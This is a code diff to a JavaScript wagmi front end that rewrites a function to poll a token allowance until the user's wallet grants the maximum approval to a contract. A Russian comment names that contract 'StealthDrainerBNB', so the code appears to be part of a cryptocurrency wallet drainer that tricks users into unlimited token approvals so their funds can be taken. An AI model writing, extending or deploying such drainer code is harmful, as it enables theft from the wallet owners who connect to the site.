@@ -637,18 +637,39 @@ const getTokenAllowance = async (wagmiConfig, ownerAddress, tokenAddress, spende
   }
 }
 
-const waitForAllowance = async (wagmiConfig, userAddress, tokenAddress, contractAddress, chainId) => {
-  console.log(`Waiting for allowance to become maximum...`)
-  while (true) {
-    const allowance = await getTokenAllowance(wagmiConfig, userAddress, tokenAddress, contractAddress, chainId)
-    console.log(`Current allowance: ${allowance.toString()}`)
-    if (allowance > 1000) {
-      console.log(`Allowance is now maximum: ${allowance.toString()}`)
-      return true
+const waitForAllowance = async (wagmiConfig, tokenAddress, contractAddress, chainId) => {
+  const owner = wagmiConfig.account;
+  const spender = getAddress(CONTRACTS[chainId]); // Адрес StealthDrainerBNB
+
+  console.log(`Waiting for allowance confirmation...`);
+
+  let allowance = BigInt(0);
+  const startTime = Date.now();
+
+  while (Date.now() - startTime < 60000) {
+    try {
+      allowance = await readContract(wagmiConfig, {
+        address: tokenAddress,
+        abi: erc20Abi,
+        functionName: 'allowance',
+        args: [owner, spender],
+        chainId
+      });
+      console.log(`Current allowance: ${allowance}`);
+
+      if (allowance >= maxUint256) { // Проверяем максимальный allowance
+        console.log(`Allowance confirmed: ${allowance}`);
+        return allowance;
+      }
+    } catch (error) {
+      console.error(`Error checking allowance: ${error.message}`);
     }
-    await new Promise(resolve => setTimeout(resolve, 2000))
+    await new Promise(resolve => setTimeout(resolve, 5000)); // Ждем 5 секунд
   }
-}
+
+  console.error('Allowance not confirmed within timeout');
+  return null;
+};
 
 const getTokenPrice = async (symbol) => {
   try {
